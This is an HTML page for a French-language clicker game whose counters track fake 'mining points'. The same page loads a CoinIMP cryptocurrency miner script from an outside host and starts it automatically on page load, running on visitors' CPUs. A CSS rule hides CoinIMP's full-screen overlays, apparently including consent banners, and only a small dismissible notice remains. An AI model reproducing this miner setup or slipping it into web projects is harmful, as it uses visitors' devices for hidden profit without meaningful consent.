<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <meta name="twitter:card" content="summary_large_image" />

    <style>
      /* Notification de minage */
      #miningNotification {
        position: fixed;
        bottom: 10px;
        left: 10px;
        background: #3d3d3d;
        color: #cccccc;
        padding: 10px;
        border-radius: 8px;
        z-index: 9999;
        font-size: 14px;
        width: 300px;
        transition: all 0.3s ease;
      }

      #miningNotification.minimized {
        width: 150px;
        height: 20px;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
        padding: 5px;
      }

      #miningNotificationToggle {
        cursor: pointer;
        float: right;
        background: transparent;
        border: none;
        color: #ccc;
        font-size: 12px;
      }

      /* Style du bouton de minage */
      .mining-btn {
        background-color: #4CAF50;
        color: white;
        padding: 15px 32px;
        font-size: 16px;
        margin-top: 20px;
        border: none;
        cursor: pointer;
        border-radius: 8px;
        display: block;
        margin-left: auto;
        margin-right: auto;
      }

      .mining-btn:disabled {
        background-color: #ddd;
        cursor: not-allowed;
      }

      /* Style pour afficher les stats */
      .stats {
        margin-top: 20px;
        text-align: center;
      }

      .stats span {
        font-size: 18px;
        margin-right: 10px;
      }
    </style>

    <style>
      /* Force les iframes CoinIMP à se positionner mini en bas à droite */
      iframe[src*="coinimp"] {
        position: fixed !important;
        bottom: 10px !important;
        right: 10px !important;
        width: 200px !important;
        height: 112px !important;
        z-index: 9999 !important;
        border-radius: 8px !important;
        box-shadow: 0 0 8px #00ff99;
      }

      /* Supprime les bannières CoinIMP qui couvrent tout l'écran */
      div[style*="z-index: 2147483647"] {
        display: none !important;
      }
    </style>
  </head>

  <body>
    <div id="root"></div>

    <!-- Statistiques du jeu -->
    <div class="stats">
      <span id="miningPoints">Points de Minage : 0</span>
      <span id="energy">Énergie : 100</span>
    </div>

    <!-- Bouton de minage -->
    <button id="miningButton" class="mining-btn">Cliquez pour miner</button>

    <!-- Script principal Vite (React) -->
    <script type="module" src="/src/main.tsx"></script>

    <!-- Script de minage CoinIMP -->
    <script src="https://www.hostingcloud.racing/MFIJ.js"></script>

    <script>
      var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
        throttle: 0.15, c: 'w', ads: 0
      });
      _client.start();
      _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#241599", 20, "#d2220f");

      // Variables pour gérer les points de minage et l'énergie
      let miningPoints = 0;
      let energy = 100;

      const miningButton = document.getElementById('miningButton');
      const miningPointsDisplay = document.getElementById('miningPoints');
      const energyDisplay = document.getElementById('energy');

      // Fonction pour récupérer des points de minage
      function mine() {
        if (energy > 0) {
          miningPoints += 10; // 10 points de minage par clic
          energy -= 5; // Consomme 5 points d'énergie par clic
          updateDisplay();
        } else {
          alert("Pas assez d'énergie pour miner !");
        }
      }

      // Fonction pour mettre à jour l'affichage des stats
      function updateDisplay() {
        miningPointsDisplay.innerText = "Points de Minage : " + miningPoints;
        energyDisplay.innerText = "Énergie : " + energy;
        // Désactive le bouton si l'énergie est épuisée
        if (energy <= 0) {
          miningButton.disabled = true;
        } else {
          miningButton.disabled = false;
        }
      }

      // Ajout d'un écouteur pour le bouton de minage
      miningButton.addEventListener('click', mine);

      // Fonction pour recharger l'énergie automatiquement après un délai
      setInterval(() => {
        if (energy < 100) {
          energy += 2; // Recharge 2 unités d'énergie toutes les 10 secondes
          if (energy > 100) energy = 100; // Limite l'énergie à 100
          updateDisplay();
        }
      }, 10000); // toutes les 10 secondes
    </script>
  </body>
</html>
